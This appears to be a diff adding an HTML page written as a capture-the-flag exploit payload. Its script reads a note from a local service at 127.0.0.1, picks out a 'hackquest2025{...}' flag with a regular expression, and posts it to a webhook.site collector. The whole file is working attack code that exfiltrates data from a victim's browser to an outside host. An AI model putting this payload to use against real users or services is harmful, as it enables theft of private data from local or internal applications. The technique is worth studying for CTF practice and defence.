@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+(async () => {
+  const res = await fetch("http://127.0.0.1:15667/note?id=4");
+  const text = await res.text();
+  const flag = /hackquest2025\{.*?\}/.exec(text);
+  if (flag) {
+    await fetch("https://webhook.site/abcd-1234...", {
+      method: "POST",
+      mode: "no-cors",
+      body: flag[0]
+    });
+  }
+})();
+</script>
+</body>
+</html>
